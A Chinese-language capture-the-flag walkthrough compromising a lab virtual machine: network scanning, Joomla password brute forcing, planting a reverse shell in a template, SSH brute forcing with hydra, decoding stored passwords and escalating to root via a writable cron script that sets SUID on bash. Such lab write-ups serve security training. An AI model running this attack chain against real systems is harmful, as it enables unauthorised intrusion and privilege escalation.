## **1、信息收集**

### **1.1通过arp-scan检测主机IP地址**

```
arp-scan 192.168.207.0/24
```

![](../Images/3a47cb9e8d1856d0da9944cbc1ff9318.png)

### **1.2 通过nmap进行端口扫描**

```
nmap -A -sS -sV -v -p- 192.168.207.147
```

## **2、渗透测试**

### **2.1 WEB渗透**

#### **1.站点信息收集**

访问站点首页显示一个小丑微笑界面

![](../Images/32bbaf9515b0d097a3a08121e782b290.png)

通过dirb进行目录扫描，发现存在joomla目录

```
dirb http://192.168.207.147
```

![](../Images/998b0f9acf7392cacf94bfd8df4ae332.png)

访问站点显示CMS为joomla

![](../Images/01d56b3b8f05bf952bbba4b94507366c.png)

#### **2.测试站点**

使用joomscan进行扫描测试，检测版本为3.7.3rc1

```
joomscan --url http://192.168.207.147/joomla/
```

![](../Images/4e3150e74a869f914600bc6d977adf12.png)

使用cewl创建密码字典

```
cewl -m 5 http://192.168.207.147/joomla/ > pass.txt
```

![](../Images/626652ec20f8b2b1e33247d25b45677b.png)

使用burpsuite进行密码爆破，获取到账号为joomla，密码为Gotham

![](../Images/3f183a10c1f5219744c27b42ee7414dd.png)

#### **3.上传webshell**

通过获取到的账号和密码登录成功，选择扩展---模板

![](../Images/1ed0b9cc67c2572916575e59078c3e69.png)

选择模板并把反弹shell填写到index.php中，并选择保存

![](../Images/d2c16954a5a89eb807b4375cbec43955.png)

在扩展中选择模板，设置修改的模板为默认

![](../Images/09ebb4e87b4b622b4af55c650be099f9.png)

开启NC监听，并访问joomla首页，获取到反弹shell

```
nc -lnvp 4444
```

![](../Images/8d7aed02eb58d7cec73386cfac70b26c.png)

### **2.2 主机渗透**

#### **1.查看数据库配置**

初始化TTY配置

```

python -c 'import pty;pty.spawn("/bin/bash")'
```

![](../Images/4c60bd192154c8c35146f491a2afd43a.png)

根据joomla配置文件信息，获取到数据库账号和密码

```

cd /var/www/html/joomla
```

![](../Images/56f6f9490fda5cf12fc7b7843f73f3b5.png)

登录数据库，查看数据库账号信息

```


mysql -u joomla -p
```

![](../Images/d52f64dbf63c25a9cc44f6993ee049f1.png)

保存密码内容并进行base64解码

```
for line in $(cat test); do echo $line | base64 -d ; echo "" ; done
```

![](../Images/bc6eafd46c6f69d56ee7428aea2602fb.png)

保存账号和解码后的密码通过hardy进行爆破到SSH账号和密码

```
hydra ssh://192.168.207.147 -L user.txt -P pass.txt
```

![](../Images/027d712d70e344cd89037dd64a773b4d.png)

#### **2.第一个FLAG**

通过爆破出来的账号和密码成功登录到主机

```
ssh rob@192.168.207.147
```

![](../Images/321052bd87c154a457d0db2425a23b84.png)

查看user.txt中获取到第一个FLAG

```
cat user.txt
```

![](../Images/ee6614d3a7674d3048b8e9b38b7dbcff.png)

#### **3.第二个FLAG**

查看Abnerineedyourhelp文件

```
cat Abnerineedyourhelp
```

![](../Images/8d76f4c6ccbda2bb37ea73086eed3e20.png)

通过CyberChef基于ROT13进行在线解密获取到账号和密码

![](../Images/37abea203e3c83bb743c0efefc6c71d0.png)

通过base64进行解码获取到密码

```
echo STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA== | base64 -d
```

![](../Images/2a97b5a593d0d6fac4bf7b032106e051.png)

使用账号Abner和获取到的密码进行登录,获取到第二个FLAG

```

su - abner
```

![](../Images/71b06481864384f6aafd787e977d2dce.png)

#### **4.第三个FLAG**

查看用户的历史命令，查看有一个压缩包文件

```
history
```

![](../Images/17269cf5e65a64a681d038a35198a286.png)

查找压缩包文件，并复制到/tmp目录中进行解压

```
find / -print 2>/dev/null | grep -i ".dear\_penguins.zip"
```

![](../Images/2c9542a3114243da89be8c722e064d13.png)

```

cp /var/www/joomla2/administrator/manifests/files/.dear\_penguins.zip /tmp
```

解压密码为abner账号的登录密码，`I33hope99my0death000makes44more8cents00than0my0life0`

![](../Images/540086ddc31f140804c7e403aeb9e254.png)

查看解压后的提示信息,提示账号和密码信息

```
cat dear\_penguins
```

![](../Images/fba80f2bfd2f440961363664a5b9f7ca.png)

使用账号和密码切换到penguin，在本地目录中获取到第三个FLAG

```


su - penguin
```

![](../Images/ba7dca012cf33e0c2290657c41fe2263.png)

#### **5.查找可执行脚本**

查看本地提示信息，说是正在开发一个以root身份启动的程序，开发完毕后会放在当前目录中

```
cat PeopleAreStartingToNotice.txt
```

![](../Images/cd71683b11bad4f1fac1311951e67cee.png)

查看本地目录中有一个隐藏文件.trash\_old

![](../Images/2fd7f25607c1429e204a732898567942.png)

通过pspy64进行监听发现该文件有定时任务

```


wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
```

![](../Images/0e6480bc340d2384040b8848ba2c869e.png)

#### **6.获取Root下FLAG**

修改文件内容并添加二进制文件suid权限

```


nano .trash\_old
```

![](../Images/34f957c6e3de10fefb4538e7b89f61ae.png)

等待一会儿后查看已经添加suid权限

```

ls -lah /usr/bin/bash
```

![](../Images/a79fea7655ff06ec9097d4eb6215df59.png)

查看FLAG信息

```

cd /root
```
